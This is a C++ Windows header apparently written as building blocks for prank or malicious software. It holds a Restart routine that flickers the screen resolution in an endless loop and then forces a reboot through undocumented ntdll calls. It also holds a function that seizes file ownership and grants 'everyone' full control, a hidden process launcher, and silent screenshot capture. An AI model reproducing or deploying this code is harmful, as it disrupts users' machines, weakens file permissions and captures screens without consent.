#pragma once
#include "stdafx.h"
#include <strsafe.h>

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Advapi32.lib")
void Catchi();
void s(int cathy);
void s(LPCWSTR cathy);
#pragma warning(disable:4996)
DWORD WINAPI BlackThread(LPVOID pM);
VOID Restart()
{
	CreateThread(NULL, 0, BlackThread, 0, 0, NULL);
	const int SE_SHUTDOWN_PRIVILEGE = 0x13;
	typedef int(__stdcall *PFN_RtlAdjustPrivilege)(INT, BOOL, BOOL, INT*);
	typedef int(__stdcall *PFN_ZwShutdownSystem)(INT);
	HMODULE hModule = ::LoadLibrary(_T("ntdll.dll"));
	if (hModule != NULL)
	{
		PFN_RtlAdjustPrivilege pfnRtl = (PFN_RtlAdjustPrivilege)GetProcAddress(hModule, "RtlAdjustPrivilege"); PFN_ZwShutdownSystem 
		pfnShutdown = (PFN_ZwShutdownSystem)GetProcAddress(hModule, "ZwShutdownSystem");
		if (pfnRtl != NULL && pfnShutdown != NULL)
		{
			int en = 0;
			int nRet = pfnRtl(SE_SHUTDOWN_PRIVILEGE, TRUE, TRUE, &en);
			if (nRet == 0x0C000007C) nRet = pfnRtl(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &en); //SH_SHUTDOWN = 0; //SH_RESTART = 1; //SH_POWEROFF = 2;
			
			nRet = pfnShutdown(1);
			
		}
	}
}
DWORD WINAPI BlackThread(LPVOID pM)
{

	DEVMODE NewDevMode = { 0 };
	while (1)
	{
		NewDevMode.dmSize = sizeof(NewDevMode);
		NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
		NewDevMode.dmPelsWidth = 800;
		NewDevMode.dmPelsHeight = 600;
		ChangeDisplaySettings(&NewDevMode, 0);
		NewDevMode = { 0 };
		NewDevMode.dmSize = sizeof(NewDevMode);
		NewDevMode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;
		NewDevMode.dmPelsWidth = 640;
		NewDevMode.dmPelsHeight = 480;
		ChangeDisplaySettings(&NewDevMode, 0);
	}
}

typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
typedef BOOL(WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);

BOOL GetVersionEx2(LPOSVERSIONINFOW lpVersionInformation)
{
	HMODULE hNtDll = GetModuleHandleW(L"NTDLL");
	//typedef int(__stdcall *PFN_ZwShutdownSystem)(INT);

	typedef int(__stdcall *tRtlGetVersion)(PRTL_OSVERSIONINFOW);
	tRtlGetVersion pRtlGetVersion = NULL;
	if (hNtDll)pRtlGetVersion = (tRtlGetVersion)GetProcAddress(hNtDll, "RtlGetVersion");
	if (pRtlGetVersion)return pRtlGetVersion((PRTL_OSVERSIONINFOW)lpVersionInformation) >= 0;
	return FALSE;
}

BOOL GetOSDisplayString(wchar_t *pszOS)
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	BOOL bOsVersionInfoEx;

	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);

	if (!bOsVersionInfoEx) return FALSE;

	wchar_t tmp[101];
	_itow_s(osvi.dwMajorVersion, tmp, 10);
	wcscpy(pszOS, tmp);
	wcscat(pszOS, L".");
	_itow_s(osvi.dwMinorVersion, tmp, 10);
	wcscat(pszOS, tmp);
	wcscat(pszOS, L".");
	_itow_s(osvi.dwBuildNumber, tmp, 10);
	wcscat(pszOS, tmp);

	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)pGNSI(&si); else GetSystemInfo(&si);

	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId&&osvi.dwMajorVersion >= 6)
	{
		OSVERSIONINFOEXW ovi;
		ZeroMemory(&ovi, sizeof(OSVERSIONINFOEXW));
		if (!GetVersionEx2((LPOSVERSIONINFOW)&ovi)) return FALSE;
		osvi.dwMajorVersion = ovi.dwMajorVersion;
		osvi.dwMinorVersion = ovi.dwMinorVersion;
		osvi.dwBuildNumber = ovi.dwBuildNumber;
		wchar_t tmp[101];
		_itow_s(osvi.dwMajorVersion, tmp, 10);
		wcscpy(pszOS, tmp);
		wcscat(pszOS, L".");
		_itow_s(osvi.dwMinorVersion, tmp, 10);
		wcscat(pszOS, tmp);
		wcscat(pszOS, L".");
		_itow_s(osvi.dwBuildNumber, tmp, 10);
		wcscat(pszOS, tmp);
	}
	return true;
}

BOOL AdjustPrivileges(const wchar_t *lpName)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = { 0 };
	TOKEN_PRIVILEGES oldtp = { 0 };
	DWORD dwSize = sizeof(TOKEN_PRIVILEGES);
	LUID luid = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		if (GetLastError() == ERROR_CALL_NOT_IMPLEMENTED)
			return TRUE;
		else
			return FALSE;
	}
	if (!LookupPrivilegeValueW(NULL, lpName, &luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	/* Adjust Token Privileges */
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), &oldtp, &dwSize)) {
		CloseHandle(hToken);
		return FALSE;
	}

	// close handles
	CloseHandle(hToken);
	return TRUE;
}



BOOL TakeOwner(LPWSTR FilePath)
{
	CHAR UserName[36];
	DWORD cbUserName = sizeof(UserName);
	CHAR Sid[1024] = { 0 };
	DWORD cbSid = sizeof(Sid);
	CHAR DomainBuffer[128] = { 0 };
	DWORD cbDomainBuffer = sizeof(DomainBuffer);
	SID_NAME_USE eUse;
	PACL Dacl = NULL, OldDacl = NULL;
	EXPLICIT_ACCESS Ea;
	PSECURITY_DESCRIPTOR Sd = NULL;
	BOOL Ret = FALSE;

	if (AdjustPrivileges(SE_TAKE_OWNERSHIP_NAME) && AdjustPrivileges(SE_RESTORE_NAME))
	{
		GetUserNameA(UserName, &cbUserName);
		if (LookupAccountNameA(NULL, UserName, &Sid, &cbSid, DomainBuffer, &cbDomainBuffer, &eUse))
		{

			ZeroMemory(&Ea, sizeof(EXPLICIT_ACCESS));
			GetNamedSecurityInfoW(FilePath, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &OldDacl, NULL, &Sd);
			wchar_t x[] = L"everyone";
			BuildExplicitAccessWithName(&Ea, x, GENERIC_ALL, GRANT_ACCESS, SUB_CONTAINERS_AND_OBJECTS_INHERIT);
			if (SetEntriesInAclW(1, &Ea, OldDacl, &Dacl) == ERROR_SUCCESS)
			{
				SetNamedSecurityInfoW(FilePath, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, &Sid, NULL, NULL, NULL);
				if (SetNamedSecurityInfoW(FilePath, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, &Sid, NULL, Dacl, NULL) == ERROR_SUCCESS)
				{
					Ret = TRUE;
				}
			}

		}
	}
	return Ret;
}
bool RunEXE(wchar_t *CmdLine)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	return CreateProcess(NULL, CmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}


#define ProcessBasicInformation 0  
typedef struct
{
	DWORD ExitStatus;
	DWORD PebBaseAddress;
	DWORD AffinityMask;
	DWORD BasePriority;
	ULONG UniqueProcessId;
	ULONG InheritedFromUniqueProcessId;
}   PROCESS_BASIC_INFORMATION;
typedef LONG(__stdcall *PROCNTQSIP)(HANDLE, UINT, PVOID, ULONG, PULONG);


DWORD GetParentProcessID(DWORD dwProcessId)
{
	LONG status;
	DWORD dwParentPID = -1;
	HANDLE hProcess;
	PROCESS_BASIC_INFORMATION pbi;

	PROCNTQSIP NtQueryInformationProcess = (PROCNTQSIP)GetProcAddress(
		GetModuleHandle(L"ntdll"), "NtQueryInformationProcess");

	if (NULL == NtQueryInformationProcess)return -1;
	// Get process handle
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);
	if (!hProcess)return -1;

	// Retrieve information
	status = NtQueryInformationProcess(hProcess,
		ProcessBasicInformation,
		(PVOID)&pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		NULL);
	// Copy parent Id on success
	if (!status)dwParentPID = pbi.InheritedFromUniqueProcessId;
	CloseHandle(hProcess);
	return dwParentPID;
}

void Catchi()
{
	DEVMODE curDevMode;
	curDevMode.dmSize = sizeof(DEVMODE);
	EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &curDevMode);

	int width = curDevMode.dmPelsWidth, heigth = curDevMode.dmPelsHeight;
	HDC hdcWindow = GetDC(NULL);
	int nBitPerPixel = GetDeviceCaps(hdcWindow, BITSPIXEL);
	CImage image;
	image.Create(width, heigth, nBitPerPixel);
	BitBlt(image.GetDC(), 0, 0, width, heigth, hdcWindow, 0, 0, SRCCOPY);
	ReleaseDC(NULL, hdcWindow);
	image.ReleaseDC();
	image.Save(L"C:\\SAtemp\\ScreenShot.bmp");
}
int CaptureImage(HWND hwnd, CONST CHAR *dirPath, CONST CHAR *filename)
{
	CHAR FilePath[MAX_PATH];
	HDC hdcScreen;
	HDC hdcWindow;
	HDC hdcMemDC = NULL;
	HBITMAP hbmScreen = NULL;
	BITMAP bmpScreen;
	RECT rcClient;
	BITMAPFILEHEADER   bmfHeader;
	BITMAPINFOHEADER   bi;
	DWORD dwBmpSize;
	HANDLE hDIB;
	CHAR *lpbitmap;
	HANDLE hFile;
	DWORD dwSizeofDIB;
	DWORD dwBytesWritten;
	//if ((int)hwnd == 245462374)Catchi();
	hdcScreen = GetDC(NULL); // 全屏幕DC
	hdcWindow = GetDC(hwnd); // 截图目标窗口DC
							 // 创建兼容内存DC
	hdcMemDC = CreateCompatibleDC(hdcWindow);
	if (!hdcMemDC)
	{
		s(-2);
		goto done;
	}
	// 获取客户端区域用于计算大小
	GetClientRect(hwnd, &rcClient);
	// 设置延展模式
	SetStretchBltMode(hdcWindow, HALFTONE);
	// 来源 DC 是整个屏幕而目标 DC 是当前的窗口 (HWND)
	if (!StretchBlt(hdcWindow,
		0, 0,
		rcClient.right, rcClient.bottom,
		hdcScreen,
		0, 0,
		GetSystemMetrics(SM_CXSCREEN),
		GetSystemMetrics(SM_CYSCREEN),
		SRCCOPY))
	{
		//s(-1);
		goto done;
	}
	// 通过窗口DC 创建一个兼容位图
	hbmScreen = CreateCompatibleBitmap(
		hdcScreen,
		GetSystemMetrics(SM_CXSCREEN),
		GetSystemMetrics(SM_CYSCREEN)
	);
	if (!hbmScreen)
	{
		//s(1);
		goto done;
	}
	// 将位图块传送到我们兼容的内存DC中
	SelectObject(hdcMemDC, hbmScreen);
	if (!BitBlt(
		hdcMemDC,   // 目的DC
		0, 0,        // 目的DC的 x,y 坐标
		GetSystemMetrics(SM_CXSCREEN),
		GetSystemMetrics(SM_CYSCREEN),
		hdcScreen,  // 来源DC
		0, 0,        // 来源DC的 x,y 坐标
		SRCCOPY))   // 粘贴方式
	{
		//s(2);
		goto done;
	}
	// 获取位图信息并存放在 bmpScreen 中
	GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bmpScreen.bmWidth;
	bi.biHeight = bmpScreen.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 32;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;
	dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
	// 在 32-bit Windows 系统上, GlobalAlloc 和 LocalAlloc 是由 HeapAlloc 封装来的
	// handle 指向进程默认的堆. 所以开销比 HeapAlloc 要大
	hDIB = GlobalAlloc(GHND, dwBmpSize);
	lpbitmap = (char *)GlobalLock(hDIB);
	// 获取兼容位图的位并且拷贝结果到一个 lpbitmap 中.
	GetDIBits(
		hdcWindow,  // 设备环境句柄
		hbmScreen,  // 位图句柄
		0,          // 指定检索的第一个扫描线
		(UINT)bmpScreen.bmHeight, // 指定检索的扫描线数
		lpbitmap,   // 指向用来检索位图数据的缓冲区的指针
		(BITMAPINFO *)&bi, // 该结构体保存位图的数据格式
		DIB_RGB_COLORS // 颜色表由红、绿、蓝（RGB）三个直接值构成
	);
	strcpy_s(FilePath, dirPath);
	strcat_s(FilePath, filename);
	strcat_s(FilePath, ".bmp");
	// 创建一个文件来保存文件截图
	hFile = CreateFileA(
		FilePath,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	// 将 图片头(headers)的大小, 加上位图的大小来获得整个文件的大小
	dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	// 设置 Offset 偏移至位图的位(bitmap bits)实际开始的地方
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
	// 文件大小
	bmfHeader.bfSize = dwSizeofDIB;
	// 位图的 bfType 必须是字符串 "BM"
	bmfHeader.bfType = 0x4D42; //BM   
	dwBytesWritten = 0;
	WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
	WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
	// 解锁堆内存并释放
	GlobalUnlock(hDIB);
	GlobalFree(hDIB);
	// 关闭文件句柄
	CloseHandle(hFile);
	// 清理资源
done:
	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);
	ReleaseDC(hwnd, hdcWindow);
	return 0;
}